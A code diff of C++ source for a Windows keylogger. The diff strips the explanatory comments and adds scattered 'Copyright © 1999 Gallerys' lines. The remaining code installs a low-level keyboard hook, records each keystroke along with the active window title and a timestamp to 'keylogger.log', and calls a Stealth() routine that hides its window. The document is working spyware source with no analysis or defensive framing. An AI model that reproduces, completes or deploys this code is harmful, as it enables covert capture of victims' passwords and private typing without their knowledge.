@@ -10,13 +10,8 @@
 
 // Copyright © 1999 Gallerys
 #define visible // (visible / invisible)
-// defines which format to use for logging
-// 0 for default, 10 for dec codes, 16 for hex codex
 #define FORMAT 0
-// defines if ignore mouseclicks
 #define mouseignore
-// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
-// or you will get problems since every function uses this variable.
 
 #if FORMAT == 0
 const std::map<int, std::string> keyname{ 
@@ -53,39 +48,28 @@ const std::map<int, std::string> keyname{
 #endif
 HHOOK _hook;
 
-// Copyright © 1999 Gallerys
 KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke);
 std::ofstream output_file;
 
-// This is the callback function. Consider it the event that is raised when, in this case,
-// a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode >= 0)
 	{
-		// the action is valid: HC_ACTION.
 		if (wParam == WM_KEYDOWN)
 		{
-			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
-			// save to file
 			Save(kbdStruct.vkCode);
 		}
 	}
 
-	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
 void SetHook()
 {
-	// Set the hook and set it to use the callback function above
-	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
-	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
-	// function that sets and releases the hook.
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
 	{
 		LPCWSTR a = L"Failed to install hook!";
@@ -107,7 +91,7 @@ int Save(int key_stroke)
 #ifndef mouseignore 
 	if ((key_stroke == 1) || (key_stroke == 2))
 	{
-		return 0; // ignore mouse clicks
+		return 0;
 	}
 #endif
 	HWND foreground = GetForegroundWindow();
@@ -116,7 +100,6 @@ int Save(int key_stroke)
 
 	if (foreground)
 	{
-		// get keyboard layout of the thread
 		threadID = GetWindowThreadProcessId(foreground, NULL);
 		layout = GetKeyboardLayout(threadID);
 	}
@@ -129,14 +112,11 @@ int Save(int key_stroke)
 		if (strcmp(window_title, lastwindow) != 0)
 		{
 			strcpy(lastwindow, window_title);
-            // get time
             struct tm* tm_info;
             time_t t = time(NULL);
             tm_info = localtime(&t);
             char s[64];
             strftime(s, sizeof(s), "%FT%X%z", tm_info);
-
-
 			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
 		}
 	}
@@ -153,20 +133,16 @@ int Save(int key_stroke)
 	else
 	{
 		char key;
-		// check caps lock
 		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
-		// check shift key
 		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
 			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
 		{
 			lowercase = !lowercase;
 		}
 
-		// map virtual key according to keyboard layout
 		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
 
-		// tolower converts it to lowercase properly
 		if (!lowercase)
 		{
 			key = tolower(key);
@@ -174,7 +150,6 @@ int Save(int key_stroke)
 		output << char(key);
 	}
 #endif
-	// instead of opening and closing file handlers every time, keep file open and flush.
 	output_file << output.str();
 	output_file.flush();
 
@@ -195,21 +170,17 @@ void Stealth()
 
 int main()
 {
-	// open output file in append mode
 	const char* output_filename = "keylogger.log";
 	std::cout << "Logging output to " << output_filename << std::endl;
 	output_file.open(output_filename, std::ios_base::app);
 
-	// visibility of window
 	Stealth();
 
-	// set the hook
 	SetHook();
 
-	// loop to keep the console application running.
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 	}
-	// Copyright © 1999 Gallerys
+// Copyright © 1999 Gallerys
 }
